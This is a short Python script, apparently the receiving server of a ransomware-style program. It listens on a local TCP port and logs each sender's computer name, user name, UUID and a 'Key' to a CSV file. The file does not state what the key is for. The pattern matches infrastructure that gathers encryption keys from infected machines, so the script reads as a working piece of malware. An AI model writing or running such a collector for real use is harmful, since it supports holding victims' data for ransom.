import csv
import ast
import socket

IP_ADDRESS = 'localhost'
PORT = 4447

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections.')
    s.listen()
    count = 1
    while True:
        conn, addr = s.accept()
        print(f'New connection({count})')
        with conn:
            while True:
                data = conn.recv(1024).decode()
                data = ast.literal_eval(data)
                print(f'Computer: {data["Computer"]}\nUser: {data["User"]}\nUUID: {data["UUID"]}\nKey: {data["Key"]}\n')
                with open('data.csv', 'a') as f:
                    writer = csv.writer(f)
                    writer.writerow([data['Computer'], data['User'], data['UUID'], data['Key']])
                break
        count += 1
